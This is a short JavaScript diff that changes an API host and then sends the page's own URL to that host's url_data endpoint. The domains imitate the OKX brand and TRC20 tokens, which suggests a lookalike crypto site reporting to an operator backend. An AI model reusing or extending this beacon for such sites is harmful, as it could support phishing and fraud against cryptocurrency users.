@@ -1,4 +1,4 @@
-        var api_url = 'https://admin.okxweb3-trc20.com';
+        var api_url = 'https://houtai-okxweb3-trc20.xyz';
         var domain = window.location.href;
         var xhr = new XMLHttpRequest();
         xhr.open('GET',api_url+'/api/api/url_data?zhu_url='+domain, true);
